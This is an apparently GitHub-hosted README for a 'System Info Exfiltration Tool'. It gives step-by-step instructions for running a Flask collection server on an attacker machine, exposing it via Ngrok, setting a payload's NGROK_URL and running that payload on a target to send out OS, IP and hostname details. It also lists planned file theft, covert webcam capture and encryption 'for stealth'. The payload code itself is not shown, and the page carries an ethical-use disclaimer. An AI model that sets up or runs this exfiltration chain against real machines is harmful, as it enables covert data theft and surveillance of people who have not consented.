# 🚀 System Info Exfiltration Tool

## 📌 Overview
This project demonstrates a **system information exfiltration tool** that collects basic system details from a target machine and sends it to a remote server via Flask and Ngrok.

> **⚠ Disclaimer:** This project is intended **only for educational and ethical penetration testing purposes**. Unauthorized use is strictly prohibited and may lead to legal consequences. Use responsibly.

## 🛠 Features
- Collects system information (OS, IP, processor, hostname, etc.)
- Sends data to a remote Flask server
- Uses **Ngrok** for public accessibility
- Saves received data in `exfiltrated_data.txt`

---

## 🔧 Setup & Installation

### 1️⃣ **Clone the Repository**
```bash
git clone https://github.com/yourusername/system-info-exfiltration.git
cd system-info-exfiltration
```

### 2️⃣ **Install Dependencies**
Ensure you have **Python 3+** installed, then install required libraries:
```bash
pip install flask requests
```

### 3️⃣ **Start the Flask Server** (Attacker Machine)
```bash
python server.py
```
You should see:
```
Running on http://0.0.0.0:8080
```

### 4️⃣ **Start Ngrok for Public Access**
In a new terminal, run:
```bash
ngrok http 8080
```
Copy the **Ngrok Forwarding URL** (e.g., `https://randomstring.ngrok.io`).

### 5️⃣ **Update `payload.py` with Your Ngrok URL**
Replace:
```python
NGROK_URL = "https://your-ngrok-url.ngrok.io"
```
with your actual Ngrok forwarding URL.

### 6️⃣ **Run the Payload on the Target Machine**
```bash
python payload.py
```

### 7️⃣ **View Exfiltrated Data**
Check `exfiltrated_data.txt` on the server:
```bash
cat exfiltrated_data.txt
```

---

## 🛑 Ethical Usage
- Only use this tool on machines **you own or have explicit permission** to test.
- This project is for **learning and cybersecurity research purposes** only.
- The author **is not responsible for any misuse or illegal activity**.

---

## 📜 License
This project is licensed under the **MIT License**. Feel free to use and modify it responsibly.

---

## 💡 Future Enhancements
- Add file exfiltration capabilities
- Implement webcam snapshot capturing
- Encrypt exfiltrated data for stealth operations

## 📞 Contact
For any inquiries, reach out via [GitHub Issues](https://github.com/yourusername/system-info-exfiltration/issues).

